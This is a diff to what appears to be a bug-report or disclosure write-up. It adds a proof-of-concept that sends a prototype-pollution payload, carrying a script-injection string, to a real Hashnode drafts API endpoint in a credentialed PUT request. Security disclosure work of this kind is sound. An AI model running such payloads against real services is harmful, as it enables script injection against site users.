@@ -474,6 +474,41 @@ fetch('https://hashnode.com/api/drafts/6a26b23b5557747c5c330fbc', {
   <img src="POC/temp_02.png" alt="POC Thumbnail" width="800"/>
 </a>
 
+
+
+
+
+
+<a target="_blank">
+  <img src="POC/POC_04.png" alt="POC Thumbnail" width="800"/>
+</a>
+
+## POC code
+
+```js
+const payload = JSON.parse(
+  '{"__proto__":{"srcdoc":"<img src=x onerror=alert(12)>"}}'
+);
+
+fetch('https://hashnode.com/api/drafts/6a26b23b5557747c5c330fbc', {
+  method: 'PUT',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  credentials: 'include',
+  body: JSON.stringify({
+    title: "Test",
+    contentMarkdown: JSON.stringify(payload)
+  })
+})
+.then(async r => {
+  console.log("Status:", r.status);
+  console.log(await r.text());
+})
+.catch(console.error);
+```
+
+
 ### Step 2: Test via Query Parameters on the PUT request
 
 ```javascript
